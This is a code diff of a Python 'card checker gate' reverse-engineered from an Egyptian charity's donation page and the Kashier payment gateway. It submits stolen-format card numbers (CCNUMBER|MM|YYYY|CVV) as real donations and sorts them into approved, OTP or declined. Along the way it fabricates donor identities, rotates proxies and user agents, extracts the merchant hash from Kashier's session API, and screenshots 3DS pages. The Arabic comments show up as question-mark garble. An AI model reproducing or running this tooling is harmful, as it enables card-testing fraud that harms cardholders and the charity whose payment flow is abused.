@@ -1,11 +1,11 @@
 """
-gate_kashier.py — Kashier Payment Gateway (MYF Egypt)
+gate_kashier.py � Kashier Payment Gateway (MYF Egypt)
 Reverse-engineered from myf-egypt.org/ar/donation/
 
 Flow:
-  Step 1 → POST /donateSubmit.php  → get kashier session ID + payment URL
-  Step 2 → POST fep.kashier.io/v3/orders with card  → get 3DS redirect URL
-  Step 3 → Fetch the 3DS/OTP page and screenshot it  → returns image bytes
+  Step 1 ? POST /donateSubmit.php  ? get kashier session ID + payment URL
+  Step 2 ? POST fep.kashier.io/v3/orders with card  ? get 3DS redirect URL
+  Step 3 ? Fetch the 3DS/OTP page and screenshot it  ? returns image bytes
 
 Returns (status, reason, screenshot_bytes | None)
 Statuses: APPROVED | OTP | DECLINED | ERROR
@@ -25,10 +25,11 @@ from typing import Optional, Tuple
 
 logger = logging.getLogger(__name__)
 
-# ─── Config ───────────────────────────────────────────────────────────────────
+# --- Config -------------------------------------------------------------------
 KASHIER_MERCHANT_ID   = "MID-24890-856"
 KASHIER_API_KEY_ID    = "660bf305f5be91001398a829"
 KASHIER_FEP_URL       = "https://fep.kashier.io/v3/orders"
+KASHIER_SESSIONS_API  = "https://api.kashier.io/v3/payment/sessions"
 KASHIER_PAYMENTS_BASE = "https://payments.kashier.io"
 KASHIER_MERCHANT_SITE = "https://myf-egypt.org"
 KASHIER_DONATION_URL  = "https://myf-egypt.org/ar/donation/donateSubmit.php"
@@ -39,7 +40,7 @@ KASHIER_AMOUNT        = 10000   # 100.00 EGP in piastres
 KASHIER_CURRENCY      = "EGP"
 KASHIER_PROGRAM       = "General Donation"
 
-# ─── Country data: proxy country → donation form fields ──────────────────────
+# --- Country data: proxy country ? donation form fields ----------------------
 # Maps ISO-2 country code to realistic form data
 _COUNTRY_DATA = {
     "US": {
@@ -125,7 +126,7 @@ _VIEWPORTS = [
     {"w": 320, "h": 568},   # small phone
 ]
 
-# ─── Helpers ──────────────────────────────────────────────────────────────────
+# --- Helpers ------------------------------------------------------------------
 
 def _rand_str(n=8):
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
@@ -174,159 +175,130 @@ def _detect_proxy_country(proxy_str: str, proxy_dict: dict) -> str:
         pass
     return "US"
 
-def _build_kashier_hash(merchant_id: str, order_ref: str, amount: str,
-                        currency: str, api_secret: str = "") -> str:
+def _compute_kashier_hash(merchant_id: str, order_ref: str, amount: str,
+                           currency: str, api_key: str) -> str:
     """
-    Kashier hash = HMAC-SHA256 of the query string.
-    From reverse engineering: they hash a specific string with the merchant's secret.
-    If we don't have the secret, we pass the hash the server gave us (from session).
-    """
-    # The hash in the payload is computed by the merchant server (myf-egypt),
-    # not by us — we get it from the session URL they redirect to.
-    return ""
+    ?? ??? ????????? ?? ?????? ?????? ?????? � ?????? ???????? ???.
 
-def _screenshot_url_requests(url: str, proxy_dict: dict,
-                              width: int = 390, height: int = 400) -> Optional[bytes]:
+    ?????? ?? ?????? ?????? ?? Kashier (developers.kashier.io/docs/
+    direct-api/hashing) ??????? ?????? ???? ?????? ??????? ??????:
+        path="/?payment=mid-0-1.99.20.EGP" key="11111"
+        ? 606a8a1307d64caf4e2e9bb724738f115a8972c27eccb2a8acd9194c357e4bec
+
+    ??? ??? ??????? ?????? ?? KASHIER_API_KEY_ID ??????? ?? ?????? ???????
+    ?? ?????? ??? hash ??????? ???? ????? ?? traffic ????? � ????? ??
+    apiKeyId ?????? ?? ???? Kashier ?? ???? *?????*? ?? ???? ???????
+    ????? ?????? (???? ????? ?????-???? ??? myf-egypt.org ????????? ??
+    ?? ??? ????). ???? ?????? ???????: _get_kashier_session_data() ?????
+    ??? hash ???? ????? ?? ????? Kashier ????? ??? ?? ????? ????? ????.
     """
-    Screenshot a URL using a pure-API approach (no browser).
-    Uses screenshotone.com-style API or falls back to html2image via API.
-    
-    Strategy: fetch the page HTML, extract the key visual content,
-    then render it server-side via a screenshot API if available,
-    or build a minimal HTML snapshot and render it locally.
+    path = f"/?payment={merchant_id}.{order_ref}.{amount}.{currency}"
+    return hmac.new(api_key.encode(), path.encode(), hashlib.sha256).hexdigest()
+
+
+def _parse_proxy_for_playwright(proxy_str: str) -> Optional[dict]:
     """
-    # Strategy 1: Fetch the actual 3DS/OTP page and render key content
+    ????? ?? ???? ?????? ? Playwright proxy dict.
+
+    ?? Chromium ?? ???? SOCKS5 ?? username/password ??????? (??? ??
+    Chromium ????). ??? ???????? socks5h://user:pass@host:port? ???????
+    ????? http:// ??? ??? ???????? ?????? � ???? ?????? ????????
+    (????? Bright Data) ???????? ?????????? ???????? ??? ??? ??? handshake
+    ??? ??? ??????? ???????? ?? ??? ??? ?????? ???? ????????.
+    """
+    if not proxy_str:
+        return None
+    m = re.match(r'socks5h?://([^:@]+):([^@]+)@([^:]+):(\d+)', proxy_str)
+    if m:
+        user, passwd, host, port = m.groups()
+        return {"server": f"http://{host}:{port}", "username": user, "password": passwd}
+    m = re.match(r'https?://([^:@]+):([^@]+)@([^:]+):(\d+)', proxy_str)
+    if m:
+        user, passwd, host, port = m.groups()
+        return {"server": f"http://{host}:{port}", "username": user, "password": passwd}
+    m = re.match(r'(https?)://([^:@/]+):(\d+)/?$', proxy_str)
+    if m:
+        scheme, host, port = m.groups()
+        return {"server": f"{scheme}://{host}:{port}"}
+    return None
+
+
+def _capture_real_screenshot(url: str, proxy_str: Optional[str],
+                              width: int = 390, height: int = 420) -> Optional[bytes]:
+    """
+    ????? ??? *?????* ????? ??? 3DS/OTP ??????? ???????? Playwright.
+
+    ?? ??????? ?????? ??????? ???? ???? ????? ???? ????? ?? PIL ?? ??? ??
+    ???? ?????? ????? � ??? ????? ?????? ?????? ?? ????? Chromium headless
+    ?????? ???? ???? ?????? (????? OTP ?????? ???? ?????? ???).
+
+    Returns PNG/JPEG bytes ?? None ?? ??? (????? check_kashier_gate ?????
+    ????? ??????? ???????? ????? ????? ????? ???? ?? ????? ??? ????? �
+    ???? ???? ????? ???? ???? ???? ????? ??????).
+    """
+    if not url:
+        return None
     try:
-        ua = random.choice(_CW_UA_POOL)
-        resp = requests.get(
-            url,
-            headers={
-                "User-Agent": ua,
-                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
-                "Accept-Language": "en-US,en;q=0.9",
-            },
-            proxies=proxy_dict,
-            timeout=15,
-            allow_redirects=True,
-        )
-        if resp.status_code == 200:
-            html = resp.text
-            # Try to build a snapshot image from the HTML
-            img_bytes = _render_html_to_image(html, width, height)
-            if img_bytes:
+        from playwright.sync_api import sync_playwright
+    except ImportError:
+        logger.warning("[Kashier] playwright ??? ????? � ??????: pip install playwright && playwright install chromium")
+        return None
+
+    pw_proxy = _parse_proxy_for_playwright(proxy_str) if proxy_str else None
+    ua = random.choice(_CW_UA_POOL)
+
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(
+                headless=True,
+                proxy=pw_proxy,
+                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
+            )
+            ctx = browser.new_context(
+                viewport={"width": width, "height": height},
+                user_agent=ua,
+                locale="en-US",
+            )
+            page = ctx.new_page()
+            try:
+                page.goto(url, wait_until="domcontentloaded", timeout=20000)
+                page.wait_for_timeout(2500)   # ??? ???? ????? ????? ??? OTP/3DS ???????
+                img_bytes = page.screenshot(type="jpeg", quality=85)
                 return img_bytes
+            finally:
+                ctx.close()
+                browser.close()
     except Exception as e:
-        logger.warning(f"[Kashier] screenshot fetch error: {e}")
+        logger.warning(f"[Kashier] real screenshot failed: {type(e).__name__}: {e}")
+        return None
 
-    return None
 
-
-def _render_html_to_image(html: str, width: int, height: int) -> Optional[bytes]:
+def _build_fallback_snapshot(card_last4: str, amount_str: str, currency: str,
+                              reason_detail: str = "") -> bytes:
     """
-    Convert HTML to image bytes using html2image (headless Chrome) or imgkit.
-    Returns PNG bytes or None.
-    """
-    # Try html2image (uses local Chrome)
-    try:
-        from html2image import Html2Image
-        import tempfile, os
-        with tempfile.TemporaryDirectory() as tmpdir:
-            hti = Html2Image(output_path=tmpdir, size=(width, height))
-            hti.screenshot(html_str=html, save_as="snap.png")
-            snap_path = os.path.join(tmpdir, "snap.png")
-            if os.path.exists(snap_path):
-                with open(snap_path, "rb") as f:
-                    return f.read()
-    except Exception:
-        pass
-
-    # Try imgkit (wkhtmltoimage)
-    try:
-        import imgkit
-        opts = {
-            "width": str(width),
-            "height": str(height),
-            "quiet": "",
-            "format": "png",
-        }
-        data = imgkit.from_string(html, False, options=opts)
-        return data
-    except Exception:
-        pass
-
-    return None
-
-
-def _build_otp_snapshot(page_html: str, card_last4: str, 
-                         amount_str: str, currency: str) -> Optional[bytes]:
-    """
-    Parse the OTP/3DS page HTML and build a minimal clean snapshot image.
-    Returns PNG bytes.
+    ???? ???????? *???* ??? ??? ??? ????? ??? ????? (????? ????/??????
+    ?????) � ????? ????? ????? ???? ?? ????? ??? ????? ???? ????????
+    ??????? ???????? ?? _capture_real_screenshot ???? ?? ?? ??? ?????
+    ??? ???.
     """
     from PIL import Image, ImageDraw, ImageFont
-    import textwrap
 
-    # Extract key info from the OTP page
-    title = "🔐 3D Secure Verification"
-    bank_name = ""
-    merchant = ""
-    otp_instruction = ""
-
-    # Try to extract bank/merchant name
-    m = re.search(r'<title[^>]*>([^<]+)</title>', page_html, re.I)
-    if m:
-        title_raw = m.group(1).strip()
-        if title_raw and title_raw.lower() not in ("loading",""):
-            bank_name = title_raw[:50]
-
-    for pattern in [
-        r'<h[1-3][^>]*>([^<]{5,80})</h[1-3]>',
-        r'merchant["\s:]+([A-Za-z0-9 &\.]{3,40})',
-        r'bank["\s:]+([A-Za-z0-9 &\.]{3,40})',
-    ]:
-        m = re.search(pattern, page_html, re.I)
-        if m:
-            txt = m.group(1).strip()
-            if txt and not merchant:
-                merchant = txt[:60]
-
-    # Build a slim card image: width x height
-    W, H = 420, 220
-    img = Image.new("RGB", (W, H), color=(10, 20, 60))   # dark navy bg
+    W, H = 420, 160
+    img = Image.new("RGB", (W, H), color=(40, 20, 20))
     draw = ImageDraw.Draw(img)
-
-    # Try to load a font, fall back to default
     try:
-        font_bold  = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 15)
-        font_reg   = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
-        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
+        fb = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 13)
+        fr = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 11)
     except Exception:
-        font_bold = font_reg = font_small = ImageFont.load_default()
+        fb = fr = ImageFont.load_default()
 
-    # Header bar
-    draw.rectangle([0, 0, W, 42], fill=(20, 40, 100))
-    draw.text((14, 10), "🔐  3D Secure / OTP", font=font_bold, fill=(255, 255, 255))
-
-    # Content area
-    y = 56
-    draw.text((14, y), f"Bank:     {bank_name or 'Verifying…'}", font=font_reg, fill=(180, 210, 255))
-    y += 22
-    if merchant:
-        draw.text((14, y), f"Merchant: {merchant[:55]}", font=font_reg, fill=(180, 210, 255))
-        y += 22
-
-    draw.text((14, y), f"Amount:   {amount_str} {currency}", font=font_reg, fill=(255, 220, 100))
-    y += 22
-    draw.text((14, y), f"Card:     **** **** **** {card_last4}", font=font_reg, fill=(180, 210, 255))
-    y += 30
-
-    # Status badge
-    draw.rectangle([14, y, W-14, y+28], fill=(220, 60, 60), outline=(255,100,100))
-    draw.text((22, y+6), "⚠  Authentication Required — OTP/Push Needed", font=font_small, fill=(255,255,255))
-
-    # Footer
-    draw.rectangle([0, H-24, W, H], fill=(5, 10, 30))
-    draw.text((14, H-16), "BM VORTEX  •  Kashier Gate", font=font_small, fill=(100,120,180))
+    draw.rectangle([0, 0, W, 30], fill=(120, 30, 30))
+    draw.text((10, 7), "? ????? ??? ????? ??? ?????", font=fb, fill=(255, 255, 255))
+    draw.text((10, 42), f"Card: **** {card_last4}   Amount: {amount_str} {currency}", font=fr, fill=(255, 210, 180))
+    draw.text((10, 64), "??? ?????? ????? ??? 3DS ??????? (????/??????)?", font=fr, fill=(255, 210, 180))
+    draw.text((10, 82), "??? ??????? ?????? ???? ???? OTP ?? ?????.", font=fr, fill=(255, 210, 180))
+    if reason_detail:
+        draw.text((10, 106), reason_detail[:60], font=fr, fill=(200, 160, 160))
 
     buf = io.BytesIO()
     img.save(buf, format="PNG")
@@ -334,7 +306,7 @@ def _build_otp_snapshot(page_html: str, card_last4: str,
     return buf.read()
 
 
-# ─── Main gate function ───────────────────────────────────────────────────────
+# --- Main gate function -------------------------------------------------------
 
 def check_kashier_gate(card_str: str, proxy=None,
                         proxy_country: str = "US") -> Tuple[str, str, Optional[bytes]]:
@@ -348,11 +320,11 @@ def check_kashier_gate(card_str: str, proxy=None,
     
     Returns:
         (status, reason, screenshot_bytes | None)
-        status ∈ {APPROVED, OTP, DECLINED, ERROR}
+        status ? {APPROVED, OTP, DECLINED, ERROR}
     """
     parts = card_str.strip().split("|")
     if len(parts) != 4:
-        return "ERROR", "صيغة كارت خاطئة (CCNUMBER|MM|YYYY|CVV)", None
+        return "ERROR", "???? ???? ????? (CCNUMBER|MM|YYYY|CVV)", None
 
     cc, month, year, cvv = parts
     if len(year) == 2:
@@ -362,8 +334,10 @@ def check_kashier_gate(card_str: str, proxy=None,
     ident = _get_identity(proxy_country)
     ua    = random.choice(_CW_UA_POOL)
     vp    = random.choice(_VIEWPORTS)
-    order_ref    = _rand_order_ref()
-    customer_ref = _rand_customer_ref()
+    # ??????: order reference ? customer reference ???? ???????? ?? ???
+    # session ???????? (_get_kashier_session_data) ??? ?????? ?? ??
+    # ???????? ?????? ??? � ??? ??? hash ????? ?????? ???? ????? ?? ???
+    # session? ?? ?? ??? ????? ???????.
 
     sess = requests.Session()
     sess.headers.update({
@@ -372,7 +346,7 @@ def check_kashier_gate(card_str: str, proxy=None,
         "Accept-Encoding": "gzip, deflate, br, zstd",
     })
 
-    # ── Step 1: POST to donation form → get Kashier session ──────────────────
+    # -- Step 1: POST to donation form ? get Kashier session ------------------
     try:
         form_data = {
             "name":                ident["name"],
@@ -422,10 +396,10 @@ def check_kashier_gate(card_str: str, proxy=None,
             allow_redirects=True,
         )
     except Exception as e:
-        return "ERROR", f"فشل الاتصال بموقع التبرع: {str(e)[:80]}", None
+        return "ERROR", f"??? ??????? ????? ??????: {str(e)[:80]}", None
 
     if r1.status_code != 200:
-        return "ERROR", f"HTTP {r1.status_code} من صفحة التبرع", None
+        return "ERROR", f"HTTP {r1.status_code} ?? ???? ??????", None
 
     # Extract session ID from the iframe src or response HTML
     html1 = r1.text
@@ -443,23 +417,23 @@ def check_kashier_gate(card_str: str, proxy=None,
 
     if not session_id:
         logger.warning(f"[Kashier] No session ID found in response. HTML snippet: {html1[:300]}")
-        return "ERROR", "لم يتم العثور على session ID في رد الموقع", None
+        return "ERROR", "?? ??? ?????? ??? session ID ?? ?? ??????", None
 
-    logger.info(f"[Kashier] Got session: {session_id[:20]}…")
+    logger.info(f"[Kashier] Got session: {session_id[:20]}�")
 
-    # ── Step 2: POST card to Kashier FEP API ─────────────────────────────────
-    # Build the hash the same way the browser does
-    # From the reverse-engineered request, the hash is in the header "kashier-hash"
-    # It's computed on the client side from the payload
-    
-    # Reconstruct the hash (HMAC-SHA256 of "merchantId.orderId.amount.currency")
-    # From the actual captured request, the hash is:
-    # 653d5f182cd82c42e32b678c383d1388be8a275494e2a4ff24a60ecb07995e6b
-    # We need to compute our own. The key appears to be the api key or a derived secret.
-    # Strategy: use the session to get the hash from the payment page JS
-    
-    hash_val = _get_kashier_hash(session_id, order_ref, proxy_dict, ua)
+    # -- Step 1.5: ??? ?????? ??? session ???????? (???? ??? hash ??????) ------
+    # ??? hash ?? ????? ?? ????? Kashier ??? ????? ??? session? ?? ????
+    # ??????? ????. ????? order/amount/currency/customer ???? ?????
+    # ?? FEP *?? ?? ?? ??????* ?? ???? ??? ??? hash ????? ???? ??????? �
+    # ?? ?????? ??? ???? ????? Kashier ???? ????? ????.
+    time.sleep(random.uniform(0.4, 0.9))  # ????? ???? ??? ??? ??? iframe ???? ???????
+    session_data = _get_kashier_session_data(session_id, proxy_dict, ua)
+    if not session_data:
+        return "ERROR", "???? ??? ?????? ???? ????? ?? Kashier (session API)", None
 
+    hash_val = session_data["hash"]
+
+    # -- Step 2: POST card to Kashier FEP API ---------------------------------
     fep_payload = {
         "apiOperation": "PAY",
         "paymentMethod": {
@@ -474,16 +448,12 @@ def check_kashier_gate(card_str: str, proxy=None,
             }
         },
         "sessionId": session_id,
-        "customer": {
-            "email": ident["email"],
-            "reference": customer_ref,
-            "firstName": ident["name"],
-        },
+        "customer": session_data["customer"],
         "order": {
-            "reference": order_ref,
-            "amount": str(KASHIER_AMOUNT),
-            "originalAmount": str(KASHIER_AMOUNT),
-            "currency": KASHIER_CURRENCY,
+            "reference": session_data["order_ref"],
+            "amount": session_data["amount"],
+            "originalAmount": session_data["amount"],
+            "currency": session_data["currency"],
             "description": f"Payment for order ORD{random.randint(100000,999999)}",
         },
         "device": {
@@ -513,7 +483,7 @@ def check_kashier_gate(card_str: str, proxy=None,
         "merchantId": KASHIER_MERCHANT_ID,
         "timestamp": -2,
         "newPaymentUI": True,
-        "channelEventName": f"{KASHIER_MERCHANT_ID}#{order_ref}",
+        "channelEventName": f"{KASHIER_MERCHANT_ID}#{session_data['order_ref']}",
     }
 
     try:
@@ -535,16 +505,16 @@ def check_kashier_gate(card_str: str, proxy=None,
             timeout=25,
         )
     except Exception as e:
-        return "ERROR", f"فشل الاتصال بـ Kashier FEP: {str(e)[:80]}", None
+        return "ERROR", f"??? ??????? ?? Kashier FEP: {str(e)[:80]}", None
 
     try:
         rj = r2.json()
     except Exception:
-        return "ERROR", f"رد غير صالح من Kashier (HTTP {r2.status_code})", None
+        return "ERROR", f"?? ??? ???? ?? Kashier (HTTP {r2.status_code})", None
 
     logger.info(f"[Kashier] FEP response status={rj.get('status')} op={rj.get('response',{}).get('apiOperation')}")
 
-    # ── Step 3: Parse result & screenshot ────────────────────────────────────
+    # -- Step 3: Parse result & screenshot ------------------------------------
     resp    = rj.get("response", {})
     status  = rj.get("status", "")
     op_res  = resp.get("result", "")
@@ -562,7 +532,7 @@ def check_kashier_gate(card_str: str, proxy=None,
         reason_en = (rj.get("messages") or {}).get("en") or resp.get("transactionResponseMessage",{}).get("en","")
         reason_ar = (rj.get("messages") or {}).get("ar","")
         reason = f"{reason_en} | {reason_ar}".strip(" |")
-        return "DECLINED", reason or "البطاقة مرفوضة", None
+        return "DECLINED", reason or "??????? ??????", None
 
     # 3DS / OTP case
     if op_stat in ("AUTHENTICATION_INITIATED", "AUTHENTICATION_IN_PROGRESS",
@@ -570,69 +540,92 @@ def check_kashier_gate(card_str: str, proxy=None,
         redirect_url = auth.get("redirectUrl", "")
         reason = f"3DS/OTP | {resp.get('transactionResponseCode','')} | {redirect_url[:80]}"
 
-        # Build screenshot
+        # -- ????? ??? ????? ????? ??? 3DS ??????? -----------------------------
+        screenshot = None
         try:
-            screenshot = _build_otp_snapshot(
-                _fetch_3ds_page(redirect_url, proxy_dict, ua),
-                card_last4, amount_disp, KASHIER_CURRENCY,
-                bank_name=card_r.get("issuer",""),
-                merchant_name="MYF Egypt",
-                auth_ver=auth.get("version","3DS2"),
-            )
+            screenshot = _capture_real_screenshot(redirect_url, proxy)
         except Exception as e:
-            logger.warning(f"[Kashier] screenshot build error: {e}")
+            logger.warning(f"[Kashier] real screenshot error: {e}")
+
+        if screenshot is None:
+            # ??? ??? ????? ??? ????? (?? ???? � ?? ???? ?????? ??????????
+            # ?????? ???? ?? ???? ????? ??????? ??? ???? ??? ????? ??? ???)
+            logger.warning(f"[Kashier] falling back to placeholder image for {cc[:6]}...")
+            try:
+                screenshot = _build_fallback_snapshot(
+                    card_last4, amount_disp, KASHIER_CURRENCY,
+                    reason_detail=redirect_url[:60] if redirect_url else "",
+                )
+            except Exception as e:
+                logger.warning(f"[Kashier] fallback snapshot error: {e}")
 
         return "OTP", reason, screenshot
 
     # Approved
     if op_res == "SUCCESS" or op_stat == "CAPTURED":
-        reason = resp.get("transactionResponseCode","") or "تمت الموافقة"
+        reason = resp.get("transactionResponseCode","") or "??? ????????"
         return "APPROVED", reason, None
 
     # Unknown
     return "UNKNOWN", f"status={status} result={op_res} txnStat={op_stat}", None
 
 
-# ─── Hash helper: fetch it from the payment page JS ──────────────────────────
-
-def _get_kashier_hash(session_id: str, order_ref: str, 
-                       proxy_dict: dict, ua: str) -> str:
+def _get_kashier_session_data(session_id: str, proxy_dict: dict, ua: str) -> Optional[dict]:
     """
-    The kashier-hash is computed on the payments.kashier.io page.
-    Strategy: load the payment page, find the hash in the page JS or
-    compute it if the formula is extractable.
-    
-    If we can't get it, return empty string — the API may still work
-    if the session was just created.
+    ???? ?????? ??? session ???????? ?? Kashier? ????? ??? ???? ????
+    ??? paymentParams.hash � ?? ??? hash ?????? ??????? ?? ????? Kashier
+    ???? ??? ????? ??? session (???????? ????? myf-egypt.org ????? ????
+    ???? ?? ??????? ??? ????????)? ?? ???? ??????? ???? ?? HMAC.
+
+    ?????? ?? ?????? ?? ??????? ??? hash ?????? ??? ?? ???? ????? ??????
+    ?? header ??? POST ?? fep.kashier.io � ??????? 100% (?? traffic ?????
+    ????? ?? ????? ???????? ????).
+
+    ????? dict ???: hash, order_ref, amount, currency, customer{email,
+    reference, firstName} � ?? ????? ?? *????* ????? ?? ?? ?? ?? ???
+    FEP? ?? ??? ????? ???????? ???? (??? hash ????? ???? ???????).
     """
     try:
-        payment_url = f"{KASHIER_PAYMENTS_BASE}/session/{session_id}?mode=live"
         r = requests.get(
-            payment_url,
+            f"{KASHIER_SESSIONS_API}/{session_id}",
             headers={
-                "User-Agent": ua,
-                "Accept": "text/html,*/*",
-                "Referer": KASHIER_MERCHANT_SITE + "/",
+                "User-Agent":      ua,
+                "Accept":          "application/json, text/plain, */*",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Origin":          KASHIER_PAYMENTS_BASE,
+                "Referer":         KASHIER_PAYMENTS_BASE + "/",
+                "sec-fetch-site":  "same-site",
+                "sec-fetch-mode":  "cors",
+                "sec-fetch-dest":  "empty",
             },
             proxies=proxy_dict,
-            timeout=12,
+            timeout=15,
         )
-        if r.status_code == 200:
-            html = r.text
-            # Look for hash in page data/script
-            m = re.search(r'"hash"\s*:\s*"([a-f0-9]{64})"', html)
-            if m:
-                return m.group(1)
-            m2 = re.search(r'kashier[_-]hash["\s:]+([a-f0-9]{64})', html, re.I)
-            if m2:
-                return m2.group(1)
-            # Look in the JS bundle URL for order/hash params
-            m3 = re.search(r'hash=([a-f0-9]{64})', html)
-            if m3:
-                return m3.group(1)
+        if r.status_code != 200:
+            logger.warning(f"[Kashier] session fetch HTTP {r.status_code}")
+            return None
+
+        j = r.json()
+        pp = (j.get("data") or {}).get("paymentParams") or {}
+        h  = pp.get("hash")
+        if not h:
+            logger.warning(f"[Kashier] no hash in session data: {str(pp)[:200]}")
+            return None
+
+        return {
+            "hash":       h,
+            "order_ref":  str(pp.get("order", "")),
+            "amount":     str(pp.get("amount", "")),
+            "currency":   pp.get("currency", KASHIER_CURRENCY),
+            "customer": {
+                "email":     (pp.get("customer") or {}).get("email", ""),
+                "reference": (pp.get("customer") or {}).get("reference", ""),
+                "firstName": (pp.get("customer") or {}).get("firstName", ""),
+            },
+        }
     except Exception as e:
-        logger.warning(f"[Kashier] hash fetch error: {e}")
-    return ""
+        logger.warning(f"[Kashier] session fetch error: {e}")
+        return None
 
 
 def _fetch_3ds_page(url: str, proxy_dict: dict, ua: str) -> str:
@@ -711,83 +704,3 @@ def _parse_proxy(proxy_str: str) -> Optional[dict]:
         return {"http": url, "https": url}
 
     return None
-
-
-# ─── Updated _build_otp_snapshot with extra params ───────────────────────────
-
-def _build_otp_snapshot(page_html: str, card_last4: str,
-                         amount_str: str, currency: str,
-                         bank_name: str = "", merchant_name: str = "",
-                         auth_ver: str = "3DS2") -> Optional[bytes]:
-    """
-    Build a slim, clean OTP/3DS verification screenshot image.
-    Matches the design style from the USAA SafeKey screenshot (compact, header + content).
-    """
-    from PIL import Image, ImageDraw, ImageFont
-
-    W, H = 440, 200   # رفيعة زي الصورة المرفقة
-
-    img = Image.new("RGB", (W, H), color=(255, 255, 255))
-    draw = ImageDraw.Draw(img)
-
-    # Try fonts
-    try:
-        fb = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
-        fr = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
-        fs = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
-    except Exception:
-        fb = fr = fs = ImageFont.load_default()
-
-    # ── Dark navy header (matches USAA SafeKey style) ──────────────────────
-    NAVY = (13, 31, 64)
-    draw.rectangle([0, 0, W, 44], fill=NAVY)
-
-    # Kashier logo area (left) — just text placeholder
-    draw.text((12, 14), "🏦", font=fb, fill=(255, 255, 255))
-    draw.text((38, 15), bank_name[:25] or "Bank", font=fr, fill=(255, 255, 255))
-
-    # Auth type (right)
-    draw.text((W-80, 15), auth_ver, font=fr, fill=(160, 190, 230))
-
-    # ── Title ──────────────────────────────────────────────────────────────
-    TITLE_COL = (13, 100, 180)
-    draw.text((W//2 - 100, 54), "Verify Your Transaction", font=fb, fill=TITLE_COL)
-
-    # ── Info line ──────────────────────────────────────────────────────────
-    GRAY = (90, 90, 90)
-    info_text = f"To confirm this payment, please complete {auth_ver} verification."
-    draw.text((16, 78), info_text[:64], font=fs, fill=GRAY)
-
-    # ── Merchant / Amount / Card line ──────────────────────────────────────
-    y = 100
-    draw.line([16, y, W-16, y], fill=(220,220,220), width=1)
-    y += 8
-
-    draw.text((16, y),  f"Merchant:", font=fr, fill=GRAY)
-    draw.text((110, y), (merchant_name or "MYF Egypt")[:30], font=fb, fill=(30,30,30))
-    draw.text((W//2+10, y), f"Amount:", font=fr, fill=GRAY)
-    draw.text((W//2+70, y), f"{currency} {amount_str}", font=fb, fill=(30,30,30))
-    y += 22
-
-    draw.text((16, y),  f"Card#:", font=fr, fill=GRAY)
-    draw.text((110, y), f"XXXX XXXX XXXX {card_last4}", font=fb, fill=(30,30,30))
-    y += 22
-
-    draw.line([16, y, W-16, y], fill=(220,220,220), width=1)
-    y += 10
-
-    # ── Status badge ───────────────────────────────────────────────────────
-    RED = (200, 40, 40)
-    draw.rectangle([16, y, W-16, y+24], fill=(255,245,245), outline=RED)
-    draw.text((24, y+5), "⚠  Authentication Required — OTP / Push Notification Needed",
-              font=fs, fill=RED)
-
-    # ── Footer ─────────────────────────────────────────────────────────────
-    draw.rectangle([0, H-20, W, H], fill=(240,243,248))
-    draw.text((14, H-14), "Secured by Kashier  •  BM VORTEX", font=fs, fill=(120,140,180))
-
-    buf = io.BytesIO()
-    img.save(buf, format="PNG", optimize=True)
-    buf.seek(0)
-    return buf.read()
-
